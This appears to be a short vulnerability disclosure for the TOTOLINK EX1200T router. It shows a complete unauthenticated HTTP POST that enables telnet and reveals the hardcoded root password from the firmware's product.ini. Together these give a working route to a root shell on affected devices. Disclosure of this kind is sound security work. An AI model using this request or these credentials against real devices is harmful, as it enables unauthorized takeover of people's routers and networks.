# TOTOLINK EX1200T TELNET

## Vulnerability Description

PRODUCT: TOTOLINK EX1200T V4.1.2cu.5215 (latest version)

The attacker can start telnet without authorization, the default username and password exists in the firmware.

![image-20211021175729211](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211021175729211.png)

## PoC

Telnet is enabled by sending the following POST packet .

```
POST /cgi-bin/cstecgi.cgi?action=1 HTTP/1.1
Host: 192.168.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
If-Modified-Since: Thu, 01 Jan 1970 00:00:03 GMT
Connection: close
Content-Length: 68

{"topicurl":"setTelnetCfg","telnet_enabled":"1"}
```

The default account password exists in the file `product.ini`：root:cs2012

![image-20211021175704482](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211021175704482.png)



![image-20211021175519172](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211021175519172.png)

